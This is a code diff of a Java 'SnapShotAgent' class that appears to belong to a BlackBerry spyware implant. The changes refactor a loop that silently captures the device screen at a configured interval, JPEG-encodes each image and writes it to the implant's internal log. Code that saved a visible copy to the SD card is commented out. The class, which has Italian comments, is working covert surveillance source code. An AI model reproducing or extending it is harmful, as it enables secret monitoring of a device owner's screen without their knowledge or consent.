@@ -23,56 +23,45 @@ public class SnapShotAgent extends Agent {
 
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
 
-    private int timer = 60 * 1000;
+    private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
 
-    public SnapShotAgent(int agentStatus) {
+    public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true);
         Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_SNAPSHOT,
                 "Wrong Conversion");
     }
 
-    protected SnapShotAgent(int agentStatus, byte[] confParams) {
+    protected SnapShotAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
-        debug.trace("run");
-        int width = Display.getWidth();
-        int height = Display.getHeight();
-
+    // se e' in standby non prendi la snapshot
+    public void actualRun() {
         for (;;) {
+            debug.info("Taking snapshot");
+            int width = Display.getWidth();
+            int height = Display.getHeight();
 
             Bitmap bitmap = new Bitmap(width, height);
             Display.screenshot(bitmap);
 
-            int size = width * height;
-            int[] argbData = new int[size];
-            bitmap.getARGB(argbData, 0, width, 0, 0, width, height);
-
+            //int size = width * height;
             /*
-             * byte[] plain = new byte[size * 4]; DataBuffer databuffer = new
-             * DataBuffer(plain, 0, plain.length, true); for (int i = 0; i <
-             * size; ++i) { databuffer.writeInt(argbData[i]); }
-             * 
-             * Check.ensures(plain.length == size * 4, "Wrong Plain size");
+             * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0,
+             * width, 0, 0, width, height);
              */
-
             // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
             EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                     SNAPSHOT_DEFAULT_JPEG_QUALITY);
             byte[] plain = encoded.getData();
 
-            // EncodedImage encoded = EncodedImage.createEncodedImage(plain, 0,
-            // size);
-            AutoFlashFile file = new AutoFlashFile(Path.SD_PATH
-                    + "snapshot.jpg", false);
-            if (file.exists()) {
-                file.delete();
-            }
-            file.create();
-            file.write(plain);
+            /*
+             * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH +
+             * "snapshot.jpg", false); if (file.exists()) { file.delete(); }
+             * file.create(); file.write(plain);
+             */
 
             Check.requires(log != null, "Null log");
 
@@ -80,10 +69,12 @@ public class SnapShotAgent extends Agent {
             log.writeLog(plain);
             log.close();
 
-            if (agentSleep(timer)) {
-                debug.trace(" clean stop");
+            if (smartSleep(timerMillis)) {
+                debug.info("clean stop: " + this);
                 return;
             }
+            
+            debug.trace("finished sleep");
         }
     }
 
@@ -124,9 +115,9 @@ public class SnapShotAgent extends Agent {
             int value = databuffer.readInt();
 
             if (value >= 1000) {
-                this.timer = value;
+                this.timerMillis = value;
             }
-            debug.trace("timer: " + timer);
+            debug.trace("timer: " + timerMillis);
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
